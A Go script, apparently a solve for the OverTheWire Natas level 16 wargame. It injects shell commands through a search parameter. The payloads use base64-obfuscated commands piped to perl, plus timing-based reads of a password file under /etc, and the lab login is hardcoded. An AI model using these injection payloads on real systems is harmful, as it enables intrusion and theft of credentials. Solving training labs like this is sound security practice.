package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"
)

func main() {
	// chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

	host := "natas16:3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L@natas16.natas.labs.overthewire.org"
	// fname := "/etc/natas_webpass/natas17"

	// find x'th char at the start of line
	// cmd := fmt.Sprintf("^$(dd skip=%d count=1 bs=1 if=%v).*", 0, fname)

	// find x'th char at the end of line
	// cmd := fmt.Sprintf("$(dd skip=%d count=1 bs=1 if=%v)$", 4, fname)

	// cmd := fmt.Sprintf("$(bash -c base64 -d - <<< $(echo QW1lcmljYW5pc20K)) %v#)", fname)

	// americans
	// cmd := "^$(bash -c base64\\ -d\\<\\<\\<QW1lcmljYW5pc20K==)"

	cmd := "$(bash -c base64\\ -d\\<\\<\\<c2ggLWMgImJhc2U2NCAtRCA8PDwgY0hKcGJuUWdJa0Z0WlhKcFkyRnVhWE50SWpzPSB8IHBlcmwi=)"

	// meh
	// cmd := fmt.Sprintf("$(sleep $(echo $(grep -q ^...z %v) $(( 0 + 4*$?)) ) )", fname)
	// cmd := "$(openssl enc -base64 -d <<< $(echo QW1lcmljYW5pc20K))"
	// cmd := "$(sleep $(( $(test $(dd if=/etc/natas_webpass/natas17 bs=1 count=1 skip=1 2>/dev/null) = a) 10 + 10*$?)))"
	// cmd := "$(sleep $(( $(test $(dd if=/dev/null bs=1 count=1 skip=1 2>/dev/null) $? -eq 1) 5 + 5*$?)))"

	fmt.Printf("cmd:%v\n", cmd)

	query := url.QueryEscape(cmd)

	fmt.Printf("query:%v\n", query)

	before := time.Now()
	resp, err := http.Get(fmt.Sprintf("http://%v/?needle=%v", host, query))
	if err != nil {
		// handle error
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	fmt.Print(string(body))
	after := time.Now()

	fmt.Printf("\n\n\nreturned %v", after.Sub(before))

}
